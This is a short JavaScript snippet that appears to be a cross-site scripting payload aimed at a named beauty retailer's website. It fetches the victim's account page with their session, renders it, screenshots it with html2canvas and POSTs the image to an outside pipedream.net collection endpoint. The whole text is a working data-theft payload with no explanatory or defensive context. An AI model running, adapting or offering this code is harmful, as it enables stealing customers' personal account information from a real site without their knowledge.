scriptEle = document.createElement("script");
scriptEle.setAttribute(
  "src",
  "https://html2canvas.hertzen.com/dist/html2canvas.min.js"
);
document.head.appendChild(scriptEle);

function pushScreenshotToServer(dataURL) {
  $.ajax({
    url: "https://eojpqg7lyzjhkks.m.pipedream.net",
    type: "POST",
    data: {
      image: dataURL,
    },
    dataType: "html",
    success: function () {
      console.log("Screenshot pushed to server.");
    },
  });
}

fetch("https://www.givenchybeauty.com/gb/account")
  .then((a) => a.text())
  .then((a) => {
    document.body.innerHTML = a;
    var screenshotTarget = document.body;
    html2canvas(screenshotTarget).then((canvas) => {
      document.body.appendChild(canvas);
      dataURL = canvas.toDataURL();
      pushScreenshotToServer(dataURL);
    });
  });
